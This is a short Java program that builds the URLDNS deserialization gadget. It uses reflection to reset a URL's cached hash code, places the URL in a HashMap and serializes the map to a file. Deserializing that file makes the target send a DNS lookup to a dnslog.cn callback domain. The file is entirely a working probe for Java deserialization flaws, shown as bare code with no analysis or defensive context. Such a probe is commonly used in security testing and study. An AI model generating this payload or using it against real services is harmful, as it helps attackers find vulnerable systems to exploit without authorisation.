import java.io.*;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.net.URL;

public class Main implements Serializable {

    public static void main(String[] args) throws IOException, NoSuchFieldException, IllegalAccessException, ClassNotFoundException {
        HashMap<URL, String> hashMap = new HashMap<URL, String>();
        
        URL url= new URL("http://nx3344.dnslog.cn"); //dnslog
        Field f = Class.forName("java.net.URL").getDeclaredField("hashCode");
        f.setAccessible(true);
        f.set(url, -1 );
        hashMap.put(url, "time");

        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("url.bin"));
        oos.writeObject(hashMap);

        ObjectInputStream ois = new ObjectInputStream(new FileInputStream("url.bin"));
        ois.readObject();
    }
}